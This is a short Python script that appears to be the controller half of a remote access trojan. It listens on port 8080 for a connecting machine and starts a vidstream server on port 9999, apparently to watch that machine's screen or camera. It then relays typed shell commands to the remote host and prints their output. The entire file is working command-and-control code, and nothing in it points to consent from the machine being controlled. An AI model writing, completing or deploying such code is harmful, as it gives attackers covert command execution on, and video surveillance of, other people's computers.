#Imports
from vidstream import *
from colorama import init, Fore
import socket
import os

init()#Initalization

#socket args
local_host = socket.gethostbyname(socket.gethostname())
local_port = 8080


#Create new socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((local_host, local_port))
s.listen(5)#if connects > 5 break

#Connection pending
client, addr = s.accept()
network_name = client.recv(1024).decode('utf-8')

print(f'[+]Connected[+] {addr[0]} ({addr[1]}) | {network_name}')

#Stardet server for control
server = StreamingServer(local_host, 9999)
server.start_server()

print('[~] Server Started Successfully [~]')

#main cycle
while True:
	command = input(f'{addr[0]}@{network_name}>>> ')

	if len(command) == 0:
		client.send(''.encode('utf-8'))
	if command == 'clear':
		os.system('cls')
	if command == 'quit':
		break
	else:
		client.send(command.encode('utf-8'))

	result = client.recv(1024).decode('utf-8')
	print(result)
